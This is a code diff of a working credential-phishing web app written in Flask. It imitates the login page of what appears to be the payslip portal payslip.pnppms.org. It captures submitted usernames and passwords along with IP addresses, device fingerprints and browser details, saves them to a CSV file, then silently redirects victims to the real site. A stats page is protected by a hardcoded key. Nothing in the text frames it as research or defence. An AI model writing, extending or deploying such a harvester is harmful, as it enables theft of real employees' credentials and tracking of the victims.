@@ -1,8 +1,8 @@
 from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
-import csv 
-import os 
-import time 
-import subprocess 
+import csv # getting the configuration of csv
+import os # configuration/ portable way of using operating system
+import time #getting the time
+import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
 import platform 
 import re 
 import json 
@@ -11,57 +11,57 @@ import uuid
 from datetime import datetime, timedelta
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24) 
+app.secret_key = os.urandom(24)  # Required for session
 
-# add custom filter for hashing passwords in templates
+# Add a custom filter for hashing passwords in templates
 @app.template_filter('hash')
 def hash_filter(value):
     """Hash a value for display in templates"""
     if not value:
         return "N/A"
-    # Create a type of hash(SHA-256)
+    # Create a SHA-256 hash with some salt
     hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
     # Return the full hash
     return hashed
 
-# secret access key for stats page (tip: here is the key for dashboard) 
+# Secret access key for stats page (change this to a secure value)
 STATS_ACCESS_KEY = "database"
 
-
+# Route for handling the root URL
 @app.route('/')
 def root():
     return redirect('/Account/Login')
 
-
+# Route for rendering the login page
 @app.route('/Account/Login')
 def index():
     return render_template('index.html')
 
-
+# Route for handling login form submission
 @app.route('/login', methods=['POST'])
 def login():
-    # get data from form we created in index.html
+    # Get the form data
     username = request.form.get('username')
     password = request.form.get('password')
     
     if not username or not password:
         return render_template('index.html', error="Please enter both username and password")
     
-    # dig client information
+    # Get client information
     ip_address = get_client_ip()
     device_type = get_device_type()
     device_fingerprint = generate_device_fingerprint()
     browser_info = get_browser_info()
     
-    # dig current time
+    # Get current time
     now = datetime.now()
-    adjusted_time = now + timedelta(hours=16)  
+    adjusted_time = now + timedelta(hours=8)  
     timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
     
-    # Save the data including the timestamp
+    # Save the data with the adjusted timestamp
     save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
-    # return function to redirect to the original site
+    # Redirect to external site
     return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
 
 """
@@ -87,7 +87,7 @@ def get_client_ip():
         'X-Originating-IP'            # Microsoft 
     ]
     
-    # condition to check each header in order
+    # Check each header in order
     for header in ip_headers:
         if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
             # X-Forwarded-For may contain multiple IPs, get the first one (client)
@@ -118,22 +118,24 @@ depending on their current device they try to log in.
 def get_device_type():
     user_agent = request.headers.get('User-Agent', '').lower()
     
+    # Patterns specifically for phones
     phone_patterns = [
         'android', 'iphone', 'ipod', 'blackberry', 
         'iemobile', 'opera mini', 'windows phone', 'mobile'
     ]
     
+    # Patterns for tablets (which are still mobile but not phones)
     tablet_patterns = [
         'ipad', 'tablet'
     ]
     
-    # first check if it's a phone
+    # First check if it's a phone
     if any(pattern in user_agent for pattern in phone_patterns):
         return 'Phone'
-    # if not a phone, check if it's a tablet
+    # If not a phone, check if it's a tablet
     elif any(pattern in user_agent for pattern in tablet_patterns):
         return 'Tablet'
-    # desktop if neither phone or tablet
+    # Otherwise it's a desktop
     return 'Desktop'
 
 def generate_device_fingerprint():
@@ -151,7 +153,9 @@ def generate_device_fingerprint():
     platform_info = request.cookies.get('platform_info', '')
     canvas_fp = request.cookies.get('canvas_fp', '')
     
+    # Create a unique fingerprint from multiple browser characteristics
     fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
+    # Generate a unique ID combining SHA-256 hash and a portion of UUID
     unique_id = str(uuid.uuid4())[:8]
     fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
     
@@ -259,7 +263,7 @@ def get_browser_info():
     
     return json.dumps(browser_details)
 
-def save_full_data(username, password, timestamp):
+def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
     Save simplified user data to CSV with only essential information
     """
@@ -331,7 +335,7 @@ def update_last_modified_timestamp(csv_path=None):
         
         # Apply the same time adjustment as in the login function
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=16)  
+        adjusted_time = now + timedelta(hours=8)  
         current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # Write timestamp to file
@@ -356,18 +360,18 @@ def get_last_modified_timestamp():
             modified_time = os.path.getmtime(csv_path)
             
             timestamp_dt = datetime.fromtimestamp(modified_time)
-            adjusted_time = timestamp_dt + timedelta(hours=16)  
+            adjusted_time = timestamp_dt + timedelta(hours=8)  
             return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # If all else fails, return current time with correct adjustment
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=16)  
+        adjusted_time = now + timedelta(hours=8)  
         return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
     except Exception as e:
         print(f"Error getting timestamp: {str(e)}")
         # Return current time with correct adjustment
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=16)  
+        adjusted_time = now + timedelta(hours=8)  
         return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
 
 # Add a route to view statistics with access key protection
